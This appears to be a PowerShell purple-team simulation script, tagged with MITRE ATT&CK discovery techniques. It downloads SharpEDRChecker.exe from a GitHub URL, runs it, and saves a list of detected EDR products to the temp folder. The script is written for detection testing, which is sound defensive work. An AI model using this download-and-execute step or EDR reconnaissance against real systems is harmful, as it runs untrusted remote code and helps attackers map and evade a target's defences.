<#
    T1588.002 - Obtain Capabilities: Tool
    T1518.001 - Software Discovery: Security Software Discovery
    T1082 - System Information Discovery
    T1057 - Process Discovery
    T1012 - Query Registry
    T1007 - System Service Discovery
    Check if an EDR is running on system with SharpEDRChecker.exe
    Download SharpEDRChecker.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/SharpEDRChecker.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

$adminrights = (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/SharpEDRChecker.exe"
$dumpfile = "$env:tmp\EDRChecker.txt"
$outfile = "$env:tmp\EDRChecker.exe"

# Download and execute SharpEDRChecker
try {
    Invoke-WebRequest $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: SharpEDRChecker.exe downloaded to $outfile"
        if ($adminrights -eq $True){
            Write-Host -ForegroundColor Cyan "Executing with admin rights"
            & $outfile /accepteula -nobanner > $dumpfile
        }
        else{
            Write-Host -ForegroundColor Cyan "Executing without admin rights, forcing check on registry keys"
            & $outfile /accepteula -nobanner -Force > $dumpfile
        }
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download SharpEDRChecker.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: EDR list checked and saved to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to check EDR list and save it to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
